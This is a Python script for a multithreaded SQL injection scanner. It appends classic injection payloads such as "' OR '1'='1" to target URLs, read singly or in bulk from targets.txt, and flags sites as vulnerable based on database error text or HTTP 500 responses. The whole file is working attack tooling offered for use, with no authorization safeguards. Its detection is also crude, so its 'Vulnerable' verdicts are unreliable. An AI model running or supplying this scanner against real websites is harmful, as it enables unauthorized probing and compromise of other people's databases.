import requests
import sys
import threading
from queue import Queue

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Load payloads
def load_payloads():
    try:
        with open("payloads.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "\" OR \"1\"=\"1",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR ''='"
        ]

# Save results
def save_result(msg):
    with open("results.txt", "a") as f:
        f.write(msg + "\n")

# Scan a single URL
def scan_url(base_url):
    print(f"\n[*] Scanning {base_url}")
    payloads = load_payloads()
    for payload in payloads:
        test_url = base_url + payload
        try:
            response = requests.get(test_url, timeout=10)
            content = response.text.lower()

            if any(err in content for err in ["sql syntax", "mysql", "syntax error", "warning"]) or response.status_code == 500:
                msg = f"[+] Vulnerable: {base_url}{payload}"
                print(f"{GREEN}{msg}{RESET}")
                save_result(msg)
            else:
                print(f"{RED}[-] Not Vulnerable: {payload}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error with {payload}: {e}{RESET}")

# Thread worker
def worker():
    while not queue.empty():
        url = queue.get()
        scan_url(url)
        queue.task_done()

# Main entry point
if __name__ == "__main__":
    queue = Queue()

    if len(sys.argv) == 2:
        target = sys.argv[1]
        queue.put(target)
    else:
        try:
            with open("targets.txt", "r") as f:
                for line in f:
                    url = line.strip()
                    if url:
                        queue.put(url)
        except FileNotFoundError:
            print("Usage:")
            print("  python main.py <url>")
            print("  OR put multiple targets in targets.txt")
            sys.exit()

    # Clear previous results
    open("results.txt", "w").close()

    # Start threads
    thread_count = 5
    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\nScan complete. Results saved in results.txt")
